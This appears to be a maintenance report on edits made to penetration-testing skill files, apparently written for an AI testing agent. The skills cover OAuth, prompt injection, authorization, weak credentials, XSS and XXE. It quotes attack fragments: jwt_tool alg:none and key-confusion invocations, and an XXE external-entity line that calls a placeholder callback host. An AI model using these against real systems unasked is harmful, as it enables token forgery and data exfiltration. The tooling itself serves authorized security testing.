# De-spuriation report - batch E

## oauth
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill named `jwt_tool`, `curl`, and Burp EsPReSSO; I removed the three `jwt_tool` command lines (`python3 /home/pentester/tools/jwt_tool/jwt_tool.py <ID_TOKEN>`, the `-X a` alg:none variant, the `-X k -pk pub.pem` confusion variant), removed the EsPReSSO sentence, and adapted the section to `python3` decode-edit-encode plus `curl` for the authorize-callback-token chain.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** removed the source-sandbox path `/home/pentester/tools/jwt_tool` as environment-specific glue.
- **Arsenal gaps:** dedicated JWT-tampering tooling is missing, so the section now relies on a manual `python3` decode-edit-encode formulation.

## llm-prompt-injection
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** no absent tools named and no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** extracted verbatim to _migration/high-value-targets/llm-prompt-injection.md and removed from the body.
- **Other removals:** none at de-spuriation time; the `## Framework-Specific` section (LangChain/OpenAI/LlamaIndex/NeMo) was still present here, and was then dropped with every non-RDF section in `fc90ad3` (correction: the current skill carries no such section).
- **Arsenal gaps:** none.

## two-principal-authz
- **Classification:** KEEP
- **Internal agentic tools:** adapted `record_domain_knowledge` in step 1 to "Record the tokens for reuse across the workflow" and rewrote "What to file" to "record the confirmed cross-principal finding with both principals' requests and the object ID as proof" in place of `judge_and_record_finding`.
- **Arsenal:** no tools named and no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** none.
- **Arsenal gaps:** none.

## weak-credential-discovery
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** only `python3` (plus `requests`/`bs4` libraries) is used, all present, so no command lines changed.
- **Special contexts:** none present.
- **High-value targets:** none present.
- **Other removals:** none (`http://target/...` placeholders are generic and were kept).
- **Arsenal gaps:** none.

## xss
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** no absent tools named and no command lines changed.
- **Special contexts:** deleted the `## Special Contexts` heading and folded `### Email` and `### PDF and Docs` into `## Key Vulnerabilities` and `### File Uploads` into `## Injection Points`, with all bullets kept verbatim and no subsection deleted.
- **High-value targets:** none present (no such heading).
- **Other removals:** none.
- **Arsenal gaps:** none.

## xxe
- **Classification:** KEEP
- **Internal agentic tools:** none found.
- **Arsenal:** the skill invoked absent `interactsh-client -v`, so I replaced those lines with a generic attacker-controlled callback host formulation (`<!ENTITY % ex SYSTEM "http://CALLBACK/x.dtd">` plus watching that host for DNS/HTTP hits).
- **Special contexts:** deleted the `## Special Contexts` heading and folded `### SOAP` into `## Core Payloads`, `### SAML` into `## Key Vulnerabilities`, and `### SVG and Renderers` plus `### Office Docs` into `## Attack Surface`, with all bullets kept verbatim and no subsection deleted.
- **High-value targets:** extracted verbatim to _migration/high-value-targets/xxe.md and removed from the body.
- **Other removals:** removed the `xyz.oast.fun` example host as part of the interactsh adaptation.
- **Arsenal gaps:** OAST callback reception has no arsenal client, so blind-XXE confirmation now relies on an operator-provided callback host.
